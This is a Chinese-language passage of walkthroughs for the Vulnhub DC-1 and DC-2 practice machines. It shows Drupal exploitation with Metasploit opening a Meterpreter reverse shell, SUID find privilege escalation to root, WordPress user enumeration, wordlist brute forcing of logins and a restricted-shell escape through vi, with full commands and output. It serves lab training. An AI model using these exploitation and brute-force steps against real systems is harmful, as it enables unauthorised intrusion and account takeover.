4cc0unt cr3at0r                          Discovered by:                          Stefan  Horst                         (CVE-2014-3704)                           Written by:                         Claudio Viviani                      http://www.homelab.it                         info@homelab.it                     homelabit@protonmail.ch                 https://www.facebook.com/homelabit                   https://twitter.com/homelabit                 https://plus.google.com/+HomelabIt1/       https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww[!] VULNERABLE![!] Administrator user created![*] Login: test[*] Pass: test[*] Url: http://192.168.56.109/?q=node&amp;destination=node\n\n发现成功添加并可以成功以管理员身份登录。\n\n可惜在后台研究了半天，在content区域无论是添加php代码还是上传php文件都会要么被注释掉，要么被重名名。没有什么可以利用的点。\n在网上查找资料，发现有大佬说可以在module区域打开php filter模块就可以在block里面嵌入php代码了。\n遂尝试，可是block区块还是只有Full HTML、Filtered HTML以及Plain text三个选项可选，嵌入php代码还是无法执行。只能暂时放弃这条路了。\n那就看看还有什么别的漏洞能用呗。毕竟之前发现这么多exp。翻找了一下有很多远程命令执行的exp。下了一些直接利用没成，发现还有一些msf上的exp，那我们就试试msf吧。\n┌──(kali㉿kali)-[~/vulnhub/DC/1/workSpace]└─$ sudo msfconsole                                      [sudo] password for kali:                                                                             ########                  #                      #################            #                   ######################         #                  #########################      #                ############################               ##############################               ###############################              ###############################              ##############################                              #    ########   #                 ##        ###        ####   ##                                      ###   ###                                    ####   ###               ####          ##########   ####               #######################   ####                 ####################   ####                  ##################  ####                    ############      ##                       ########        ###                      #########        #####                    ############      ######                   ########      #########                     #####       ########                       ###       #########                      ######    ############                     #######################                     #   #   ###  #   #   ##                     ########################                      ##     ##   ##     ##                            https://metasploit.com       =[ metasploit v6.3.16-dev                          ]+ -- --=[ 2315 exploits - 1208 auxiliary - 412 post       ]+ -- --=[ 975 payloads - 46 encoders - 11 nops            ]+ -- --=[ 9 evasion                                       ]Metasploit tip: Metasploit can be configured at startup, see msfconsole --help to learn moreMetasploit Documentation: https://docs.metasploit.com/msf6 &gt; search drupalMatching Modules================   #  Name                                           Disclosure Date  Rank       Check  Description   -  ----                                           ---------------  ----       -----  -----------   0  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution                                                         1  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection                                                   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection                                                        3  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection                                                              4  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution                                                       5  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE                                                        6  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration                                                                7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code ExecutionInteract with a module by name or index. For example info 7, use 7 or use exploit/unix/webapp/php_xmlrpc_eval                                                                             msf6 exploit(unix/webapp/drupal_restws_exec) &gt; use 1[*] No payload configured, defaulting to php/meterpreter/reverse_tcpmsf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options Module options (exploit/unix/webapp/drupal_drupalgeddon2):   Name         Current Setting  Required  Description   ----         ---------------  --------  -----------   DUMP_OUTPUT  false            no        Dump payload command output   PHP_FUNC     passthru         yes       PHP function to execute   Proxies                       no        A proxy chain of format type:host:port[,type:hos                                           t:port][...]   RHOSTS       192.168.56.109   yes       The target host(s), see https://docs.metasploit.                                           com/docs/using-metasploit/basics/using-metasploi                                           t.html   RPORT        80               yes       The target port (TCP)   SSL          false            no        Negotiate SSL/TLS for outgoing connections   TARGETURI    /                yes       Path to Drupal install   VHOST                         no        HTTP server virtual hostPayload options (php/meterpreter/reverse_tcp):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  192.168.56.144   yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen portExploit target:   Id  Name   --  ----   0   Automatic (PHP In-Memory)View the full module info with the info, or info -d command.msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit [*] Started reverse TCP handler on 192.168.56.144:4444 [*] Running automatic check (&quot;set AutoCheck false&quot; to disable)[!] The service is running, but could not be validated.[*] Sending stage (39927 bytes) to 192.168.56.109[*] Meterpreter session 1 opened (192.168.56.144:4444 -&gt; 192.168.56.109:54480) at 2023-05-27 16:10:19 +0800meterpreter &gt; pwd/var/wwwmeterpreter &gt; getuidServer username: www-datameterpreter &gt; \n\n我们用了0，4，都没有成功，用了1成功了。\n然后此处可以直接shell获取shell或者自己传个反弹shell上去也行。\n提权sudo -l会发现sudo被扣掉了。\n查看设置的SUID的二进制文件\nfind / -type f -perm -u=s -ls 2&gt;/dev/null\n发现find本身设置了s位。\n直接利用\nwww-data@DC-1:/usr/bin$ ./find . -exec /bin/sh -p \\; -quit    /bin/sh: 0: Illegal option -p\n\n-p选项用不了，去掉试试。\nwww-data@DC-1:/usr/bin$ find . -exec /bin/sh \\; -quit     find . -exec /bin/sh \\; -quit# whoamiwhoamiroot# cd ~cd ~/bin/sh: 2: cd: can&#x27;t cd to ~# cd /rootcd /root# ls -lals -latotal 32drwx------  4 root root 4096 Feb 28  2019 .drwxr-xr-x 23 root root 4096 Feb 19  2019 ..drwx------  2 root root 4096 Feb 19  2019 .aptitude-rw-------  1 root root   44 Feb 28  2019 .bash_history-rw-r--r--  1 root root  949 Feb 19  2019 .bashrcdrwxr-xr-x  3 root root 4096 Feb 19  2019 .drush-rw-r--r--  1 root root  140 Nov 20  2007 .profile-rw-r--r--  1 root root  173 Feb 19  2019 thefinalflag.txt# cat thefinalflag.txtcat thefinalflag.txtWell done!!!!Hopefully you&#x27;ve enjoyed this and learned some new skills.You can let me know what you thought of this little journeyby contacting me via Twitter - @DCAU7\n\n轻松提权。\n","categories":["vulnhub"],"tags":["walkthrough","DC"]},{"title":"[vulnhub]  DC:2","url":"/2023/05/28/DC-2/","content":"\n\n\n简介DC系列第二台靶机。主要知识点是cewl的使用以及rbash的逃出方法。总体来说还是比较轻松有意思的。\n部署部署完之后记得在攻击机上的/etc/hosts上加上一行&lt;target-ip&gt;  dc-2,&lt;target-ip&gt;是靶机的ip，这样在网页自动跳转时才不会出错。\n信息收集主机发现，端口扫描，TCP扫描，服务探测，OS识别，脚本漏扫\n┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]└─$ sudo nmap -sn 192.168.56.0/24                            [sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-28 14:16 CSTNmap scan report for 192.168.56.1Host is up (0.00019s latency).MAC Address: 0A:00:27:00:00:08 (Unknown)Nmap scan report for 192.168.56.100Host is up (0.00015s latency).MAC Address: 08:00:27:2E:A1:5A (Oracle VirtualBox virtual NIC)Nmap scan report for 192.168.56.110Host is up (0.00075s latency).MAC Address: 08:00:27:B4:BE:CB (Oracle VirtualBox virtual NIC)Nmap scan report for 192.168.56.144Host is up.Nmap done: 256 IP addresses (4 hosts up) scanned in 2.09 seconds                                                                                             ┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]└─$ sudo nmap -p- --min-rate=10000 192.168.56.110Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-28 14:17 CSTNmap scan report for 192.168.56.110Host is up (0.0016s latency).Not shown: 65533 closed tcp ports (reset)PORT     STATE SERVICE80/tcp   open  http7744/tcp open  raqmon-pduMAC Address: 08:00:27:B4:BE:CB (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 6.15 seconds                                                                                             ┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]└─$ sudo nmap -sT -sV -sC -O -p80,7744 192.168.56.110Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-28 14:17 CSTNmap scan report for 192.168.56.110Host is up (0.00097s latency).PORT     STATE SERVICE VERSION80/tcp   open  http    Apache httpd 2.4.10 ((Debian))|_http-server-header: Apache/2.4.10 (Debian)|_http-title: Did not follow redirect to http://dc-2/7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)| ssh-hostkey: |   1024 52517b6e70a4337ad24be10b5a0f9ed7 (DSA)|   2048 5911d8af38518f41a744b32803809942 (RSA)|   256 df181d7426cec14f6f2fc12654315191 (ECDSA)|_  256 d9385f997c0d647e1d46f6e97cc63717 (ED25519)MAC Address: 08:00:27:B4:BE:CB (Oracle VirtualBox virtual NIC)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 14.68 seconds                                                                                             ┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]└─$ sudo nmap --script=vuln 192.168.56.110           Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-28 14:18 CSTNmap scan report for 192.168.56.110Host is up (0.00036s latency).Not shown: 999 closed tcp ports (reset)PORT   STATE SERVICE80/tcp open  http|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.| http-enum: |   /wp-login.php: Possible admin folder|   /readme.html: Wordpress version: 2 |   /wp-includes/images/rss.png: Wordpress version 2.2 found.|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.|   /wp-login.php: Wordpress login page.|   /wp-admin/upgrade.php: Wordpress login page.|_  /readme.html: Interesting, a readme.|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.| http-wordpress-users: | Username found: admin| Username found: tom| Username found: jerry|_Search stopped at ID #25. Increase the upper limit if necessary with &#x27;http-wordpress-users.limit&#x27;|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.MAC Address: 08:00:27:B4:BE:CB (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 36.61 seconds                                                                                             ┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]└─$ sudo nikto -h http://192.168.56.110    - Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          192.168.56.110+ Target Hostname:    192.168.56.110+ Target Port:        80+ Start Time:         2023-05-28 14:20:25 (GMT8)---------------------------------------------------------------------------+ Server: Apache/2.4.10 (Debian)+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ Root page / redirects to: http://dc-2/+ /index.php?: Drupal Link header found with value: ARRAY(0x563ec3ea0920). See: https://www.drupal.org/+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin &#x27;Tested up to&#x27; version usually matches the WordPress version.+ /wp-links-opml.php: This WordPress script reveals the installed version.+ /license.txt: License file found may identify site software.+ /wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies+ /wp-login.php: Wordpress login found.+ 8102 requests: 0 error(s) and 11 item(s) reported on remote host+ End Time:           2023-05-28 14:21:56 (GMT8) (91 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n\n我们获取到的主要信息是ssh服务开在7744端口上，且脚本漏扫扫出来的目录结构显示网站明显就是基于wordpress搭建。\n那wordpress是老熟人了，直接对症下药，用wpscan扫一扫呗。\n┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]└─$ sudo wpscan --url http://dc-2 -e   _______________________________________________________________         __          _______   _____         \\ \\        / /  __ \\ / ____|          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | &#x27;_ \\            \\  /\\  /  | |     ____) | (__| (_| | | | |             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|         WordPress Security Scanner by the WPScan Team                         Version 3.8.22       Sponsored by Automattic - https://automattic.com/       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart_______________________________________________________________[+] URL: http://dc-2/ [192.168.56.110][+] Started: Sun May 28 14:28:40 2023Interesting Finding(s):[+] Headers | Interesting Entry: Server: Apache/2.4.10 (Debian) | Found By: Headers (Passive Detection) | Confidence: 100%[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: |  - http://codex.wordpress.org/XML-RPC_Pingback_API |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/[+] WordPress readme found: http://dc-2/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: |  - https://www.iplocation.net/defend-wordpress-from-ddos |  - https://github.com/wpscanteam/wpscan/issues/1299[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03). | Found By: Rss Generator (Passive Detection) |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt; |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;[+] WordPress theme in use: twentyseventeen | Location: http://dc-2/wp-content/themes/twentyseventeen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 3.2 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.2 (80% confidence) | Found By: Style (Passive Detection) |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: &#x27;Version: 1.2&#x27;[+] Enumerating Vulnerable Plugins (via Passive Methods)[i] No plugins Found.[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:00 &lt;==================&gt; (500 / 500) 100.00% Time: 00:00:00[+] Checking Theme Versions (via Passive and Aggressive Methods)[i] No themes Found.[+] Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:03 &lt;================&gt; (2575 / 2575) 100.00% Time: 00:00:03[i] No Timthumbs Found.[+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:00 &lt;===================&gt; (137 / 137) 100.00% Time: 00:00:00[i] No Config Backups Found.[+] Enumerating DB Exports (via Passive and Aggressive Methods) Checking DB Exports - Time: 00:00:00 &lt;=========================&gt; (71 / 71) 100.00% Time: 00:00:00[i] No DB Exports Found.[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to &quot;Plain&quot; for those to be detected) Brute Forcing Attachment IDs - Time: 00:00:07 &lt;==============&gt; (100 / 100) 100.00% Time: 00:00:07[i] No Medias Found.[+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:01 &lt;====================&gt; (10 / 10) 100.00% Time: 00:00:01[i] User(s) Identified:[+] admin | Found By: Rss Generator (Passive Detection) | Confirmed By: |  Wp Json Api (Aggressive Detection) |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)[+] jerry | Found By: Wp Json Api (Aggressive Detection) |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 | Confirmed By: |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)[+] tom | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[!] No WPScan API Token given, as a result vulnerability data has not been output.[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register[+] Finished: Sun May 28 14:29:03 2023[+] Requests Done: 3444[+] Cached Requests: 9[+] Data Sent: 884.313 KB[+] Data Received: 1.063 MB[+] Memory used: 285.43 MB[+] Elapsed time: 00:00:23\n\n可以发现扫描出来了三个用户: admin,jerry,tom。\nweb渗透在尝试登录wp后台前，我们先看看网页到底长啥样。\n\n随便点点我们就找到了flag1。\nflag1提示我们常规wordlist很可能不会起作用，告诉我们最好用cewl。\ncewl是基于ruby写的字典生成工具。既然他都这么说了，那我们就用用呗。\n┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]└─$ cewl http://dc-2 -w dc-2.txt                             CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)                                                                                       ┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]└─$ cat dc-2.txt                sitametnecquisvelorcisitenonsedvitaeluctus........(太长了省略了)\n\n生成了个238词的字典，我们拿它爆破一下admin账号的登录。如果能成功就最好了。\n┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]└─$ sudo wpscan --url http://dc-2 -U &#x27;admin&#x27; -P dc-2.txt _______________________________________________________________         __          _______   _____         \\ \\        / /  __ \\ / ____|          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | &#x27;_ \\            \\  /\\  /  | |     ____) | (__| (_| | | | |             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|         WordPress Security Scanner by the WPScan Team                         Version 3.8.22       Sponsored by Automattic - https://automattic.com/       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart_______________________________________________________________[+] URL: http://dc-2/ [192.168.56.110][+] Started: Sun May 28 14:33:45 2023Interesting Finding(s):[+] Headers | Interesting Entry: Server: Apache/2.4.10 (Debian) | Found By: Headers (Passive Detection) | Confidence: 100%[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: |  - http://codex.wordpress.org/XML-RPC_Pingback_API |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/[+] WordPress readme found: http://dc-2/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: |  - https://www.iplocation.net/defend-wordpress-from-ddos |  - https://github.com/wpscanteam/wpscan/issues/1299[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03). | Found By: Rss Generator (Passive Detection) |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt; |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;[+] WordPress theme in use: twentyseventeen | Location: http://dc-2/wp-content/themes/twentyseventeen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 3.2 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.2 (80% confidence) | Found By: Style (Passive Detection) |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: &#x27;Version: 1.2&#x27;[+] Enumerating All Plugins (via Passive Methods)[i] No plugins Found.[+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:00 &lt;===================&gt; (137 / 137) 100.00% Time: 00:00:00[i] No Config Backups Found.[+] Performing password attack on Xmlrpc against 1 user/sTrying admin / flag Time: 00:00:33 &lt;==========================&gt; (238 / 238) 100.00% Time: 00:00:33[i] No Valid Passwords Found.[!] No WPScan API Token given, as a result vulnerability data has not been output.[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register[+] Finished: Sun May 28 14:34:22 2023[+] Requests Done: 379[+] Cached Requests: 37[+] Data Sent: 152.28 KB[+] Data Received: 168.256 KB[+] Memory used: 238.438 MB[+] Elapsed time: 00:00:37\n\n然而并没有成功，看来只能退而求其次，看看tom&amp;jerry两兄弟能不能成功爆破出来。\n┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]└─$ sudo wpscan --url http://dc-2 -U &#x27;jerry,tom&#x27; -P dc-2.txt_______________________________________________________________         __          _______   _____         \\ \\        / /  __ \\ / ____|          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | &#x27;_ \\            \\  /\\  /  | |     ____) | (__| (_| | | | |             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|         WordPress Security Scanner by the WPScan Team                         Version 3.8.22       Sponsored by Automattic - https://automattic.com/       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart_______________________________________________________________[+] URL: http://dc-2/ [192.168.56.110][+] Started: Sun May 28 14:35:07 2023Interesting Finding(s):[+] Headers | Interesting Entry: Server: Apache/2.4.10 (Debian) | Found By: Headers (Passive Detection) | Confidence: 100%[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: |  - http://codex.wordpress.org/XML-RPC_Pingback_API |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/[+] WordPress readme found: http://dc-2/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: |  - https://www.iplocation.net/defend-wordpress-from-ddos |  - https://github.com/wpscanteam/wpscan/issues/1299[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03). | Found By: Rss Generator (Passive Detection) |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt; |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;[+] WordPress theme in use: twentyseventeen | Location: http://dc-2/wp-content/themes/twentyseventeen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 3.2 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.2 (80% confidence) | Found By: Style (Passive Detection) |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: &#x27;Version: 1.2&#x27;[+] Enumerating All Plugins (via Passive Methods)[i] No plugins Found.[+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:00 &lt;===================&gt; (137 / 137) 100.00% Time: 00:00:00[i] No Config Backups Found.[+] Performing password attack on Xmlrpc against 2 user/s[SUCCESS] - jerry / adipiscing                                                                    [SUCCESS] - tom / parturient                                                                      Trying tom / dis Time: 00:01:01 &lt;=============                 &gt; (410 / 886) 46.27%  ETA: ??:??:??[!] Valid Combinations Found: | Username: jerry, Password: adipiscing | Username: tom, Password: parturient[!] No WPScan API Token given, as a result vulnerability data has not been output.[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register[+] Finished: Sun May 28 14:36:12 2023[+] Requests Done: 550[+] Cached Requests: 38[+] Data Sent: 237.565 KB[+] Data Received: 267.936 KB[+] Memory used: 256.16 MB[+] Elapsed time: 00:01:05\n\njerry:adipiscing;tom:parturient 猫和老鼠两兄弟凭证都成功爆破出来了。我们登录进去看看。发现在jerry账号下在pages里可以找到flag2。\n\n他说如果利用不了wordpress就走别的路吧。\n那我们肯定是不服气的，先看看wp有没有能利用的点吧。\n我们最常用的admin账号下的plugin以及themes在当前两个用户下都没有。\n那我们尝试一下文件上传呢：\n\n发现没权限写。emmmmm，那就暂时没发现可以利用的地方了（也可能是遗漏一些我不知道的get shell方式）。\n结合作者的提示和及时止损的原则，我们先试试别的路吧。\n80端口暂时走不通，试试22,不对，应该是7744端口了。\n┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]└─$ ssh jerry@192.168.56.110 -p 7744The authenticity of host &#x27;[192.168.56.110]:7744 ([192.168.56.110]:7744)&#x27; can&#x27;t be established.ED25519 key fingerprint is SHA256:JEugxeXYqsY0dfaV/hdSQN31Pp0vLi5iGFvQb8cB1YA.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#x27;[192.168.56.110]:7744&#x27; (ED25519) to the list of known hosts.jerry@192.168.56.110&#x27;s password: Permission denied, please try again.jerry@192.168.56.110&#x27;s password: ┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]└─$ ssh tom@192.168.56.110 -p 7744tom@192.168.56.110&#x27;s password: The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.tom@DC-2:~$ \n\n发现虽然jerry登不进去，但是tom可以登录。我们还是轻松获取到了立足点。\n提权然而不能高兴太早，登进来发现是个rbash也就是是个受限的shell。啥命令也没有，很难绷。\ntom@DC-2:~$ sudo -l-rbash: sudo: command not foundtom@DC-2:~$ lsflag3.txt  usrtom@DC-2:~$ cat flag3.txt-rbash: cat: command not foundtom@DC-2:~$ which-rbash: which: command not foundtom@DC-2:~$ python-rbash: python: command not foundtom@DC-2:~$ pwd/home/tomtom@DC-2:~$ whoami-rbash: whoami: command not foundtom@DC-2:~$ /bin/bash-rbash: /bin/bash: restricted: cannot specify `/&#x27; in command namestom@DC-2:~$ find-rbash: find: command not found\n\n一套连招下来就一个ls和pwd能用的,flag3在眼前看不了？\n既然cat被ban了，那我们试试vi能不能看，发现竟然可以。\nPoor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.~                                                                     ~                                                                     ~                                                                     ~                                                                     ~                                                                     ~                                                                                                                                                   &quot;flag3.txt&quot; 1 line, 95 characters\n\n他说可怜的tom是时候使用su了。\n然而可怜的tom的su命令也被扣掉了。这时候我们就去专业对口的gtfobins上找找有什么能逃出受限shell的方法。我们惊喜的发现vi就可以。这下能力越大责任越大了。\n\n方法a显然不行，因为rbash此时限制了‘&#x2F;’的使用，在上面我们试命令的时候就看得出来了。\n那我们试试方法b，发现成功逃脱。\ntom@DC-2:~$ vi$ whoami/bin/sh: 1: whoami: not found$ /bin/bashtom@DC-2:~$ whoamibash: whoami: command not foundtom@DC-2:~$ ls -latotal 40drwxr-x--- 3 tom  tom  4096 May 28 03:11 .drwxr-xr-x 4 root root 4096 Mar 21  2019 ..-rwxr-x--- 1 tom  tom   336 May 28 03:11 .bash_history-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_login-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_logout-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_profile-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bashrc-rwxr-x--- 1 tom  tom    95 Mar 21  2019 flag3.txt-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .profiledrwxr-x--- 3 tom  tom  4096 Mar 21  2019 usrtom@DC-2:~$ cat flag3.txt bash: cat: command not foundtom@DC-2:~$ echo $SHELL/bin/rbashtom@DC-2:~$ su jerrybash: su: command not foundtom@DC-2:~$ cd usrtom@DC-2:~/usr$ ls -latotal 12drwxr-x--- 3 tom tom 4096 Mar 21  2019 .drwxr-x--- 3 tom tom 4096 May 28 03:11 ..drwxr-x--- 2 tom tom 4096 Mar 21  2019 bintom@DC-2:~/usr$ cd bintom@DC-2:~/usr/bin$ ls -latotal 